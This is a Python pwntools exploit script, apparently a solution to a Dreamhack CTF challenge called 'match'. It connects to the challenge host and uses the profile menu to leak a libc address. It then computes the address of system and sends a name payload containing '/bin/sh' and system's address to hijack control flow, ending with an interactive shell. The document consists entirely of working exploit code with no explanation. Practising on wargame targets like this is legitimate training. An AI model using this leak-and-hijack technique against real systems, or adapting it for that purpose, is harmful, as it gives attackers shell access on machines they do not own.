import pwn


DEBUG = False
HOST, PORT = 'host8.dreamhack.games', 8360

if DEBUG:
    p = pwn.process(['./ld-2.31.so', './match'], env={'LD_PRELOAD':'./libc-2.31.so'})
else:
    p = pwn.remote(HOST, PORT)
#pwn.context.log_level = 'DEBUG'

e = pwn.ELF('./libc-2.31.so')

def menu(i):
    p.recvuntil('> ')
    p.sendline(str(i))

# 0. male
# 1. female
def make_profile(name, age, min_age, max_age, sex=0, hobby=['', '', '']):
    menu(0)
    p.recvuntil('age: ')
    p.sendline(str(age))
    p.recvuntil('name: ')
    p.sendline(name)
    p.recvuntil('min age limit for you: ')
    p.sendline(str(min_age))
    p.recvuntil('max age limit for you: ')
    p.sendline(str(max_age))
    p.recvuntil('> ')
    p.sendline(str(sex))

    for i in range(3):
        p.recvuntil(' : ')
        p.sendline(hobby[i])

make_profile('A' * 7, 100, 30, 2000)    # libc leak
menu(3)

p.recv(8)
libc = pwn.u64(p.recv(6) + b'\x00\x00')
print(hex(libc))

libc = libc - 275                          # _IO_file_overflow
system = libc - e.symbols['_IO_file_overflow'] + e.symbols['system']

payload = b'/bin/sh\x00'
payload += b'A' * 0x8
payload += pwn.p64(system)  # rip control
make_profile(payload, 2 ** 17, 2 ** 16, 2 ** 18)    # name, age, min, max

menu(2)

if DEBUG:
    pwn.context.terminal = ['tmux', 'splitw', '-h']
    pwn.gdb.attach(p)
    #p = pwn.gdb.debug(['./ld-2.31.so', './match'], env={'LD_PRELOAD':'./libc-2.31.so'})

pwn.context.log_level = 'INFO'
p.interactive()